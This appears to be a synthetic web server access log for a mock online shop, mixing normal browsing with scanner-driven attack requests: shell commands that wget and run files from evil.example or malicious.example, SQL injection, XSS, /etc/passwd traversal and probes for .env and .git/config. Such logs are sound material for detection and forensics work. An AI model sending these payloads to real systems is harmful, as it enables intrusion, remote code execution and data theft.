198.51.100.78 - - [21/May/2026:13:30:47 +0000] "GET /administrator HTTP/1.1" 403 760 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.10 - - [21/May/2026:09:45:23 +0000] "GET /cart HTTP/1.1" 200 1996 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.11 - - [21/May/2026:10:05:25 +0000] "GET /api/v1/products?page=2 HTTP/1.1" 200 1489 "https://mail.example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
172.16.0.46 - - [21/May/2026:20:20:34 +0000] "GET /shell?cmd=%77%67%65%74%20http%3A%2F%2Fevil.example%2Fx%20-O%20%2Ftmp%2Fx HTTP/1.1" 200 6828 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.12 - - [21/May/2026:15:10:41 +0000] "GET /products/12 HTTP/1.1" 302 750 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.21 - - [21/May/2026:20:19:48 +0000] "GET /checkout HTTP/1.1" 200 2749 "https://yandex.ru/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
91.240.118.172 - - [21/May/2026:13:49:51 +0000] "POST /wp-admin/ HTTP/1.1" 403 698 "-" "WPScan v3.8.25"
172.16.0.46 - - [21/May/2026:19:37:25 +0000] "GET /redirect?url=http%3A%2F%2Fevil.example%2Fphish HTTP/1.1" 403 217 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
91.240.118.172 - - [21/May/2026:08:39:41 +0000] "GET /config.php HTTP/1.1" 403 40 "-" "gobuster/3.6"
192.168.1.12 - - [21/May/2026:15:32:37 +0000] "GET /static/img/logo.png HTTP/1.1" 200 7572 "https://mail.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.11 - - [21/May/2026:14:32:19 +0000] "GET /api/v1/status HTTP/1.1" 200 8056 "https://yandex.ru/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.11 - - [21/May/2026:11:49:15 +0000] "GET /products HTTP/1.1" 200 2819 "https://yandex.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
185.220.101.45 - - [21/May/2026:19:27:37 +0000] "GET /shell?cmd=%77%67%65%74%20http%3A%2F%2Fevil.example%2Fx%20-O%20%2Ftmp%2Fx HTTP/1.1" 404 1077 "-" "Nmap Scripting Engine; https://nmap.org/book/nse.html"
198.51.100.78 - - [21/May/2026:18:18:17 +0000] "POST /.env HTTP/1.1" 404 229 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
45.155.205.33 - - [21/May/2026:08:32:14 +0000] "GET /search?q=%22%20OR%20%221%22%3D%221 HTTP/1.1" 404 1183 "-" "WPScan v3.8.25"
203.0.113.10 - - [21/May/2026:19:34:27 +0000] "GET /search?q=phone HTTP/1.1" 200 6965 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
91.240.118.172 - - [21/May/2026:19:11:02 +0000] "GET /backup.zip HTTP/1.1" 403 1178 "-" "Skipfish/2.10b"
203.0.113.10 - - [21/May/2026:14:46:19 +0000] "GET /contact HTTP/1.1" 200 804 "https://mail.example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.10 - - [21/May/2026:19:27:38 +0000] "GET /search?q=phone HTTP/1.1" 200 3151 "https://yandex.ru/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
45.155.205.33 - - [21/May/2026:16:08:26 +0000] "POST /admin HTTP/1.1" 404 1200 "-" "WPScan v3.8.25"
172.16.0.45 - - [21/May/2026:15:58:32 +0000] "GET /api/v1/user?id=1%27%2bOR%2b%271%27%3d%271 HTTP/1.1" 403 1144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.16.0.44 - - [21/May/2026:09:11:55 +0000] "GET /comment?text=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 404 1131 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.22 - - [21/May/2026:20:10:47 +0000] "GET /products/12 HTTP/1.1" 200 7226 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.21 - - [21/May/2026:16:17:51 +0000] "GET /static/js/app.js HTTP/1.1" 200 5013 "https://mail.example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.24 - - [21/May/2026:10:47:21 +0000] "GET / HTTP/1.1" 200 2047 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.12 - - [21/May/2026:17:45:14 +0000] "GET /search?q=laptop HTTP/1.1" 200 2680 "https://mail.example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.11 - - [21/May/2026:14:17:55 +0000] "GET /search?q=phone HTTP/1.1" 200 6715 "https://mail.example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.21 - - [21/May/2026:10:23:19 +0000] "GET /api/v1/status HTTP/1.1" 200 8116 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.10 - - [21/May/2026:08:56:24 +0000] "POST /checkout HTTP/1.1" 200 8013 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.10 - - [21/May/2026:19:24:31 +0000] "GET /products/12 HTTP/1.1" 200 5277 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.21 - - [21/May/2026:14:23:11 +0000] "GET / HTTP/1.1" 200 8864 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
198.51.100.78 - - [21/May/2026:11:11:57 +0000] "POST /shell?cd+/tmp;wget+http://malicious.example/bin;chmod+777+bin;./bin HTTP/1.1" 403 934 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.12 - - [21/May/2026:11:04:42 +0000] "GET /static/css/style.css HTTP/1.1" 200 4535 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.24 - - [21/May/2026:17:09:46 +0000] "GET /search?q=laptop HTTP/1.1" 200 2944 "https://yandex.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.12 - - [21/May/2026:18:30:15 +0000] "GET /checkout HTTP/1.1" 200 2804 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
198.51.100.79 - - [21/May/2026:18:07:46 +0000] "GET /db.sql HTTP/1.1" 404 1180 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.10 - - [21/May/2026:14:01:23 +0000] "GET /products HTTP/1.1" 200 8300 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
172.16.0.45 - - [21/May/2026:16:05:45 +0000] "GET /product?id=1/%2A%2A/UNION/%2A%2A/SELECT/%2A%2A/user%2Cpassword/%2A%2A/FROM/%2A%2A/users HTTP/1.1" 403 441 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.10 - - [21/May/2026:14:53:43 +0000] "GET /cart HTTP/1.1" 200 7973 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.13 - - [21/May/2026:19:20:44 +0000] "GET /search?q=phone HTTP/1.1" 200 1518 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.21 - - [21/May/2026:19:00:58 +0000] "GET /search?q=phone HTTP/1.1" 200 2705 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
198.51.100.79 - - [21/May/2026:14:55:04 +0000] "GET /comment?text=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.13 - - [21/May/2026:16:21:36 +0000] "GET /api/v1/status HTTP/1.1" 200 7431 "https://yandex.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
198.51.100.78 - - [21/May/2026:18:33:51 +0000] "GET /wp-content/themes/ HTTP/1.1" 404 557 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
45.155.205.33 - - [21/May/2026:08:10:31 +0000] "POST /db.sql HTTP/1.1" 403 607 "-" "Nikto/2.5.0"
10.0.0.24 - - [21/May/2026:18:14:32 +0000] "GET /search?q=laptop HTTP/1.1" 200 5539 "https://mail.example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.10 - - [21/May/2026:17:43:31 +0000] "GET /api/v1/products?page=2 HTTP/1.1" 404 492 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.11 - - [21/May/2026:14:12:40 +0000] "GET /static/css/style.css HTTP/1.1" 200 2217 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.10 - - [21/May/2026:16:18:56 +0000] "POST /checkout HTTP/1.1" 200 8633 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
198.51.100.77 - - [21/May/2026:18:50:33 +0000] "GET /.git/config HTTP/1.1" 404 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.16.0.45 - - [21/May/2026:16:51:22 +0000] "GET /search?q=test%22%20AND%20%28SELECT%201%20FROM%20%28SELECT%28SLEEP%285%29%29%29a%29-- HTTP/1.1" 404 645 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.12 - - [21/May/2026:17:22:34 +0000] "GET /static/js/app.js HTTP/1.1" 200 2093 "https://example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.11 - - [21/May/2026:10:17:41 +0000] "POST /checkout HTTP/1.1" 200 8935 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.23 - - [21/May/2026:15:44:44 +0000] "GET /about HTTP/1.1" 200 7850 "https://example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.21 - - [21/May/2026:09:05:49 +0000] "GET / HTTP/1.1" 200 1218 "https://mail.example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
198.51.100.77 - - [21/May/2026:17:02:08 +0000] "POST /wp-admin/ HTTP/1.1" 200 6858 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.10 - - [21/May/2026:15:36:13 +0000] "GET /search?q=laptop HTTP/1.1" 302 429 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.24 - - [21/May/2026:13:43:02 +0000] "GET /about HTTP/1.1" 200 7133 "https://yandex.ru/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
203.0.113.12 - - [21/May/2026:19:18:49 +0000] "GET /products/43 HTTP/1.1" 200 6759 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.16.0.44 - - [21/May/2026:15:18:49 +0000] "GET /index.php?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd HTTP/1.1" 500 433 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.12 - - [21/May/2026:13:58:56 +0000] "GET /search?q=phone HTTP/1.1" 200 8656 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.12 - - [21/May/2026:11:39:25 +0000] "GET /cart HTTP/1.1" 200 7180 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.21 - - [21/May/2026:11:13:55 +0000] "GET / HTTP/1.1" 200 5770 "https://example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.22 - - [21/May/2026:09:34:35 +0000] "GET /api/v1/products?page=1 HTTP/1.1" 200 6247 "https://mail.example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
45.155.205.33 - - [21/May/2026:18:41:24 +0000] "GET /server-status HTTP/1.1" 302 785 "-" "gobuster/3.6"
203.0.113.12 - - [21/May/2026:08:46:19 +0000] "GET /static/img/logo.png HTTP/1.1" 200 812 "https://yandex.ru/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.10 - - [21/May/2026:17:57:13 +0000] "GET /api/v1/products?page=1 HTTP/1.1" 404 457 "https://mail.example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.10 - - [21/May/2026:09:13:10 +0000] "GET /index.html HTTP/1.1" 200 7640 "https://mail.example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.24 - - [21/May/2026:19:56:36 +0000] "GET /about HTTP/1.1" 200 3749 "https://mail.example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
198.51.100.77 - - [21/May/2026:09:53:08 +0000] "GET /wp-content/plugins/ HTTP/1.1" 404 974 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.23 - - [21/May/2026:11:04:56 +0000] "GET /index.html HTTP/1.1" 200 8824 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.24 - - [21/May/2026:17:34:15 +0000] "GET /api/v1/status HTTP/1.1" 200 3893 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.10 - - [21/May/2026:12:49:37 +0000] "GET /api/v1/user/profile HTTP/1.1" 200 520 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
198.51.100.79 - - [21/May/2026:11:31:49 +0000] "GET /phpMyAdmin HTTP/1.1" 302 455 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
185.220.101.45 - - [21/May/2026:14:15:38 +0000] "POST /login HTTP/1.1" 403 1125 "-" "Nmap Scripting Engine; https://nmap.org/book/nse.html"
198.51.100.79 - - [21/May/2026:15:29:23 +0000] "GET /api/v1/login HTTP/1.1" 403 1088 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.10 - - [21/May/2026:09:33:59 +0000] "GET /api/v1/products?page=1 HTTP/1.1" 200 2102 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.11 - - [21/May/2026:12:10:57 +0000] "GET /checkout HTTP/1.1" 200 680 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
172.16.0.45 - - [21/May/2026:09:23:13 +0000] "GET /shell?cmd=%77%67%65%74%20http%3A%2F%2Fevil.example%2Fx%20-O%20%2Ftmp%2Fx HTTP/1.1" 403 1130 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.10 - - [21/May/2026:09:41:25 +0000] "GET /static/img/logo.png HTTP/1.1" 200 7930 "https://example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
91.240.118.172 - - [21/May/2026:17:54:07 +0000] "GET /wp-login.php HTTP/1.1" 200 1647 "-" "gobuster/3.6"
10.0.0.21 - - [21/May/2026:13:41:46 +0000] "GET /contact HTTP/1.1" 200 5709 "https://mail.example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.12 - - [21/May/2026:10:09:14 +0000] "GET /products/43 HTTP/1.1" 200 6683 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.21 - - [21/May/2026:14:43:21 +0000] "GET /cart HTTP/1.1" 200 7302 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.21 - - [21/May/2026:11:14:21 +0000] "GET /search?q=phone HTTP/1.1" 200 4312 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
172.16.0.46 - - [21/May/2026:18:51:34 +0000] "GET /index.php?page=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 403 830 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.12 - - [21/May/2026:19:13:27 +0000] "GET /products/43 HTTP/1.1" 200 3586 "https://mail.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.12 - - [21/May/2026:12:18:23 +0000] "GET /api/v1/status HTTP/1.1" 200 1578 "https://yandex.ru/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.22 - - [21/May/2026:09:56:42 +0000] "GET /products HTTP/1.1" 200 1060 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.24 - - [21/May/2026:14:06:07 +0000] "GET /products/12 HTTP/1.1" 200 4495 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
91.240.118.172 - - [21/May/2026:09:09:56 +0000] "GET /shell?cd+/tmp;wget+http://malicious.example/bin;chmod+777+bin;./bin HTTP/1.1" 401 706 "-" "WPScan v3.8.25"
10.0.0.21 - - [21/May/2026:15:39:13 +0000] "GET /products HTTP/1.1" 200 5627 "https://yandex.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
198.51.100.79 - - [21/May/2026:08:54:47 +0000] "POST /wp-login.php HTTP/1.1" 403 428 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.12 - - [21/May/2026:08:16:10 +0000] "GET /search?q=phone HTTP/1.1" 200 5461 "https://mail.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.24 - - [21/May/2026:10:01:12 +0000] "GET / HTTP/1.1" 200 5767 "https://mail.example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.22 - - [21/May/2026:08:02:54 +0000] "GET /search?q=phone HTTP/1.1" 302 596 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.22 - - [21/May/2026:19:30:07 +0000] "GET /api/v1/products?page=1 HTTP/1.1" 200 8371 "https://yandex.ru/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.11 - - [21/May/2026:09:39:29 +0000] "GET /search?q=laptop HTTP/1.1" 200 6747 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
198.51.100.78 - - [21/May/2026:16:53:21 +0000] "POST /api/v1/login HTTP/1.1" 404 426 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.11 - - [21/May/2026:08:58:48 +0000] "GET /products/43 HTTP/1.1" 200 4139 "https://yandex.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
198.51.100.77 - - [21/May/2026:18:49:31 +0000] "GET /config.php HTTP/1.1" 404 335 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
198.51.100.79 - - [21/May/2026:19:17:09 +0000] "GET /config.php HTTP/1.1" 404 908 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.22 - - [21/May/2026:08:10:40 +0000] "GET /search?q=laptop HTTP/1.1" 200 7905 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.11 - - [21/May/2026:12:43:26 +0000] "GET /api/v1/products?page=2 HTTP/1.1" 200 6295 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.13 - - [21/May/2026:13:09:27 +0000] "GET /api/v1/user/profile HTTP/1.1" 200 702 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
172.16.0.46 - - [21/May/2026:16:18:33 +0000] "GET /search?q=test%22%20AND%20%28SELECT%201%20FROM%20%28SELECT%28SLEEP%285%29%29%29a%29-- HTTP/1.1" 404 45 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
91.240.118.172 - - [21/May/2026:09:26:59 +0000] "GET /product?id=1%20UNION%20SELECT%201,2,3-- HTTP/1.1" 403 1133 "-" "gobuster/3.6"
172.16.0.44 - - [21/May/2026:14:50:39 +0000] "POST /shell?cd+/tmp;wget+http://malicious.example/bin;chmod+777+bin;./bin HTTP/1.1" 403 563 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.22 - - [21/May/2026:19:10:28 +0000] "GET /api/v1/products?page=1 HTTP/1.1" 302 793 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
198.51.100.79 - - [21/May/2026:09:36:29 +0000] "GET /search?q=test%22%20AND%20%28SELECT%201%20FROM%20%28SELECT%28SLEEP%285%29%29%29a%29-- HTTP/1.1" 302 426 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.13 - - [21/May/2026:14:02:27 +0000] "GET /search?q=phone HTTP/1.1" 200 960 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.22 - - [21/May/2026:17:38:14 +0000] "GET /api/v1/products?page=2 HTTP/1.1" 200 2485 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.13 - - [21/May/2026:09:21:05 +0000] "GET / HTTP/1.1" 200 2170 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
203.0.113.10 - - [21/May/2026:15:32:34 +0000] "GET /cart HTTP/1.1" 200 965 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
